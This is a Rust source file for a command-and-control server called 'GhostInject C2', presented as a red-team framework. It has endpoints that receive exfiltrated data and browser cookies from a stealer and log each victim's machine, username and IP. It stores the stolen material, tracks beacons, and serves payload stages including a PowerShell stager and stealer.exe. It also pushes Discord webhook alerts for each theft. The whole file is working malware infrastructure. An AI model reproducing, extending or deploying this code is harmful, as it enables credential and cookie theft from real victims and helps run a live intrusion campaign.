#![allow(unused_imports)]
#![allow(dead_code)]

use axum::{
    extract::{Path, State},
    response::{Json, IntoResponse, Html},
    http::{StatusCode, header},
};
use serde_json::json;
use std::sync::Arc;
use chrono::Utc;
use tracing::{info, error, debug};
use crate::{AppState};
use crate::models::*;
use base64::{engine::general_purpose::STANDARD, Engine as _};

// ============================================================
// ENDPOINT DE LOGIN (DASHBOARD)
// ============================================================
#[derive(Debug, serde::Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

pub async fn login_handler(
    State(_state): State<Arc<AppState>>,
    Json(payload): Json<LoginRequest>,
) -> impl IntoResponse {
    let password_hash = format!("{:x}", md5::compute(&payload.password));
    
    if payload.username == "admin" && password_hash == "bfacbadf1213467d95d777b33bd10a29" {
        let token = uuid::Uuid::new_v4().to_string();
        info!("[+] Successful login for user: {}", payload.username);
        
        (StatusCode::OK, Json(json!({
            "success": true,
            "token": token,
            "expires_in": 86400,
            "role": "admin"
        })))
    } else {
        error!("[-] Failed login attempt for user: {}", payload.username);
        (StatusCode::UNAUTHORIZED, Json(json!({
            "success": false,
            "error": "Invalid credentials"
        })))
    }
}

// ============================================================
// ENDPOINT PRINCIPAL DE EXFILTRAÇÃO (OPÇÃO A - DADOS DIRETOS)
// ============================================================
pub async fn exfil_handler(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<ExfilData>,
) -> impl IntoResponse {
    info!("[+] Exfil received: {} | {} bytes", payload.data_type, payload.data.len());
    
    let _ = tokio::fs::create_dir_all("./data").await;
    
    // ✅ CORRETO: Decodifica o Base64 que o stealer enviou!
    let final_data = match STANDARD.decode(&payload.data) {
        Ok(bytes) => {
            info!("[DEBUG] Base64 decoded: {} bytes", bytes.len());
            bytes
        },
        Err(e) => {
            error!("Failed to decode base64: {}", e);
            return (StatusCode::BAD_REQUEST, Json(json!({
                "success": false,
                "error": "Invalid base64 data"
            })));
        }
    };
    
    // DEBUG: Salva os dados decodificados
    let debug_text_filename = format!("./data/debug_raw_{}.txt", chrono::Utc::now().timestamp());
    let _ = tokio::fs::write(&debug_text_filename, &final_data).await;
    info!("[DEBUG] Decoded data saved to: {}", debug_text_filename);
    
    // Mostra preview se for texto
    if let Ok(text) = String::from_utf8(final_data.clone()) {
        let preview: String = text.chars().take(500).collect();
        info!("[DEBUG] Text preview: {}...", preview);
    }
    
    if final_data.is_empty() {
        return (StatusCode::BAD_REQUEST, Json(json!({
            "success": false,
            "error": "Empty data"
        })));
    }
    
    let victim_id = if payload.victim_id.is_empty() {
        match state.db.register_victim(
            &payload.machine_name,
            &payload.username,
            &payload.ip_address,
            None,
        ).await {
            Ok(id) => id,
            Err(e) => {
                error!("Failed to register victim: {}", e);
                return (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                    "success": false,
                    "error": "Database error"
                })));
            }
        }
    } else {
        if let Err(e) = state.db.update_victim_last_seen(&payload.victim_id).await {
            error!("Failed to update last_seen: {}", e);
        }
        payload.victim_id.clone()
    };
    
    // Salva no banco os bytes DECODIFICADOS
    match state.db.add_exfil_bytes(&victim_id, &payload.data_type, &final_data).await {
        Ok(exfil_id) => {
            info!("[+] Exfil saved: {} | {} bytes", payload.machine_name, final_data.len());
            
            let final_data_clone = final_data.clone();
            let victim_id_clone = victim_id.clone();
            let machine_name_clone = payload.machine_name.clone();
            let data_type_clone = payload.data_type.clone();
            
            tokio::spawn(async move {
                let dir = format!("./data/victims/{}", victim_id_clone);
                let _ = tokio::fs::create_dir_all(&dir).await;
                let filename = format!("{}/{}_{}.txt", dir, data_type_clone, machine_name_clone);
                let _ = tokio::fs::write(&filename, final_data_clone).await;
                info!("[FILE] Saved to: {}", filename);
            });
            
            let webhook = state.config.auth.discord_webhook.clone();
            if !webhook.is_empty() {
                let payload_clone = payload.clone();
                tokio::spawn(async move {
                    send_discord_notification(webhook, payload_clone).await;
                });
            }
            
            (StatusCode::OK, Json(json!({
                "success": true,
                "id": exfil_id,
                "message": "Data received successfully",
                "size": final_data.len()
            })))
        }
        Err(e) => {
            error!("Failed to save exfil: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Failed to save data: {}", e)
            })))
        }
    }
}


// ============================================================
// ENDPOINT DE BEACON (KEEP-ALIVE)
// ============================================================
pub async fn beacon_handler(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<Beacon>,
) -> impl IntoResponse {
    match state.db.add_beacon(&payload.victim_id, &payload.status).await {
        Ok(_) => {
            debug!("[+] Beacon from: {}", payload.victim_id);
            (StatusCode::OK, Json(json!({
                "success": true,
                "message": "Beacon received"
            })))
        }
        Err(e) => {
            error!("Beacon error: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Database error: {}", e)
            })))
        }
    }
}

// ============================================================
// ENDPOINT PARA RECEBER COOKIES (OPÇÃO A - DADOS DIRETOS)
// ============================================================
#[derive(Debug, serde::Deserialize)]
pub struct CookiePayload {
    pub machine_name: String,
    pub username: String,
    pub ip_address: String,
    pub cookies_base64: String,
    pub browser: String,
    pub timestamp: String,
}

pub async fn cookies_handler(
    State(state): State<Arc<AppState>>,
    Json(payload): Json<CookiePayload>,
) -> impl IntoResponse {
    info!("[+] Cookies received from: {} | Browser: {}", payload.machine_name, payload.browser);
    
    // OPÇÃO A: Pega os bytes diretos da string, sem decodificar Base64
    let cookies_bytes = match STANDARD.decode(&payload.cookies_base64) {
    Ok(bytes) => bytes,
    Err(e) => {
        error!("Failed to decode base64: {}", e);
        return (StatusCode::BAD_REQUEST, Json(json!({
            "success": false,
            "error": "Invalid base64 data"
        })));
    }
};
    info!("[+] Cookies bytes: {} bytes", cookies_bytes.len());
    
    let debug_filename = format!("./data/cookies_{}_{}_{}.txt", 
        payload.machine_name,
        payload.browser,
        chrono::Utc::now().timestamp()
    );
    let _ = tokio::fs::create_dir_all("./data").await;
    let _ = tokio::fs::write(&debug_filename, &cookies_bytes).await;
    info!("[DEBUG] Cookies saved to: {}", debug_filename);
    
    let victim_id = match state.db.register_victim(
        &payload.machine_name,
        &payload.username,
        &payload.ip_address,
        None,
    ).await {
        Ok(id) => id,
        Err(e) => {
            error!("Failed to register victim: {}", e);
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": "Database error"
            })));
        }
    };
    
    match state.db.add_exfil_bytes(&victim_id, &format!("cookies_{}", payload.browser), &cookies_bytes).await {
        Ok(exfil_id) => {
            info!("[+] Cookies saved: {} | {} bytes", payload.machine_name, cookies_bytes.len());
            
            let webhook = state.config.auth.discord_webhook.clone();
            if !webhook.is_empty() {
                tokio::spawn(send_cookie_notification(webhook, payload));
            }
            
            (StatusCode::OK, Json(json!({
                "success": true,
                "id": exfil_id,
                "message": "Cookies received successfully",
                "size": cookies_bytes.len()
            })))
        }
        Err(e) => {
            error!("Failed to save cookies: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false,
                "error": format!("Failed to save cookies: {}", e)
            })))
        }
    }
}

// ============================================================
// ENDPOINT PARA VER EXFIL COMO TEXTO BRUTO
// ============================================================
pub async fn get_raw_exfil_handler(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> impl IntoResponse {
    match state.db.get_exfil_bytes_by_id(&id).await {
        Ok(Some(data)) => {
            match String::from_utf8(data.clone()) {
                Ok(text) => {
                    (StatusCode::OK, [
                        (header::CONTENT_TYPE, "text/plain; charset=utf-8"),
                        (header::ACCESS_CONTROL_ALLOW_ORIGIN, "*"),
                    ], text).into_response()
                }
                Err(_) => {
                    let hex_preview: String = data.iter()
                        .take(100)
                        .map(|b| format!("{:02x}", b))
                        .collect();
                    let response = format!(
                        "[Binary data - {} bytes]\nHex preview (first 100 bytes):\n{}",
                        data.len(),
                        hex_preview
                    );
                    (StatusCode::OK, [
                        (header::CONTENT_TYPE, "text/plain; charset=utf-8"),
                        (header::ACCESS_CONTROL_ALLOW_ORIGIN, "*"),
                    ], response).into_response()
                }
            }
        }
        Ok(None) => (StatusCode::NOT_FOUND, "Exfil not found").into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, format!("Error: {}", e)).into_response(),
    }
}

// ============================================================
// LISTA TODAS AS VÍTIMAS
// ============================================================
pub async fn victims_handler(
    State(state): State<Arc<AppState>>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    match state.db.list_victims().await {
        Ok(victims) => Ok(Json(json!({
            "success": true, 
            "victims": victims,
            "total": victims.len()
        }))),
        Err(e) => {
            error!("Failed to list victims: {}", e);
            Err((StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false, 
                "error": format!("{}", e)
            }))))
        }
    }
}

// ============================================================
// DETALHES DE UMA VÍTIMA
// ============================================================
pub async fn victim_details_handler(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    match state.db.get_victim_exfils(&id).await {
        Ok(exfils) => Ok(Json(json!({
            "success": true, 
            "victim_id": id, 
            "exfils": exfils,
            "count": exfils.len()
        }))),
        Err(e) => {
            error!("Failed to get victim details: {}", e);
            Err((StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false, 
                "error": format!("{}", e)
            }))))
        }
    }
}

// ============================================================
// DOWNLOAD DE UM DUMP ESPECÍFICO (USA BASE64 PARA DASHBOARD)
// ============================================================
pub async fn get_exfil_handler(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    match state.db.get_exfil_by_id(&id).await {
        Ok(Some(exfil)) => {
            // Mantém encode para o Dashboard (Web) conseguir baixar
            let data_base64 = STANDARD.encode(&exfil.data);
            Ok(Json(json!({
                "success": true,
                "data_type": exfil.data_type,
                "timestamp": exfil.timestamp.to_rfc3339(),
                "victim": exfil.machine_name,
                "username": exfil.username,
                "ip": exfil.ip_address,
                "data": data_base64,
                "size": exfil.data.len(),
                "is_base64": true
            })))
        }
        Ok(None) => {
            Err((StatusCode::NOT_FOUND, Json(json!({
                "success": false, 
                "error": "Exfil not found"
            }))))
        }
        Err(e) => {
            error!("Failed to get exfil: {}", e);
            Err((StatusCode::INTERNAL_SERVER_ERROR, Json(json!({
                "success": false, 
                "error": format!("{}", e)
            }))))
        }
    }
}

// ============================================================
// SERVE PAYLOAD STAGES
// ============================================================
pub async fn payload_handler(
    Path(stage): Path<String>,
) -> impl IntoResponse {
    match stage.as_str() {
        "stage1.ps1" => {
            match include_str!("../payloads/windows/stage1.ps1") {
                "" => (StatusCode::NOT_FOUND, "Stage1 not found").into_response(),
                payload => (StatusCode::OK, [
                    (header::CONTENT_TYPE, "text/plain"),
                    (header::ACCESS_CONTROL_ALLOW_ORIGIN, "*"),
                ], payload).into_response(),
            }
        }
        "stealer.exe" => {
            let binary = include_bytes!("../payloads/windows/stealer.exe");
            if binary.is_empty() {
                (StatusCode::NOT_FOUND, "Stealer not built").into_response()
            } else {
                (
                    StatusCode::OK,
                    [
                        (header::CONTENT_TYPE, "application/octet-stream"),
                        (header::ACCESS_CONTROL_ALLOW_ORIGIN, "*"),
                    ],
                    binary.to_vec(),
                ).into_response()
            }
        }
        _ => {
            (StatusCode::NOT_FOUND, "Payload not found").into_response()
        }
    }
}

// ============================================================
// DASHBOARD WEB
// ============================================================
pub async fn dashboard_handler() -> Html<String> {
    match include_str!("../templates/dashboard.html") {
        html => Html(html.to_string()),
    }
}

// ============================================================
// HEALTH CHECK
// ============================================================
pub async fn health_handler(
    State(state): State<Arc<AppState>>,
) -> Json<serde_json::Value> {
    Json(json!({
        "status": "healthy",
        "version": env!("CARGO_PKG_VERSION"),
        "timestamp": Utc::now().to_rfc3339(),
        "services": {
            "database": "connected",
            "api": "operational"
        }
    }))
}

// ============================================================
// ROOT HANDLER
// ============================================================
pub async fn root_handler() -> &'static str {
    "GhostInject C2 Server Online — Red Team Framework\n\nEndpoints:\n- POST /login\n- POST /exfil\n- POST /beacon\n- POST /cookies\n- GET /victims\n- GET /victim/:id\n- GET /exfil/:id\n- GET /exfil/raw/:id\n- GET /payload/:stage\n- GET /dashboard\n- GET /health"
}

// ============================================================
// HELPER: NOTIFICAÇÃO DISCORD (EXFIL)
// ============================================================
async fn send_discord_notification(webhook: String, payload: ExfilData) {
    let client = reqwest::Client::new();
    let message = json!({
        "embeds": [{
            "title": "🎯 New Exfil Received!",
            "color": 0x00ff00,
            "fields": [
                {"name": "Machine", "value": payload.machine_name, "inline": true},
                {"name": "User", "value": payload.username, "inline": true},
                {"name": "IP", "value": payload.ip_address, "inline": true},
                {"name": "Type", "value": payload.data_type, "inline": true},
                {"name": "Size", "value": format!("{} bytes", payload.data.len()), "inline": true},
                {"name": "Timestamp", "value": payload.timestamp.to_rfc3339(), "inline": false}
            ],
            "footer": {"text": "GhostInject C2"}
        }]
    });
    
    let _ = client.post(&webhook).json(&message).send().await;
}

// ============================================================
// HELPER: NOTIFICAÇÃO DISCORD (COOKIES)
// ============================================================
async fn send_cookie_notification(webhook: String, payload: CookiePayload) {
    let client = reqwest::Client::new();
    let message = json!({
        "embeds": [{
            "title": "🍪 Cookies Received!",
            "color": 0xffaa00,
            "fields": [
                {"name": "Machine", "value": payload.machine_name, "inline": true},
                {"name": "User", "value": payload.username, "inline": true},
                {"name": "IP", "value": payload.ip_address, "inline": true},
                {"name": "Browser", "value": payload.browser, "inline": true},
                {"name": "Size", "value": format!("{} bytes", payload.cookies_base64.len()), "inline": true},
                {"name": "Timestamp", "value": payload.timestamp, "inline": false}
            ],
            "footer": {"text": "GhostInject C2 - Cookie Stealer"}
        }]
    });
    
    let _ = client.post(&webhook).json(&message).send().await;
}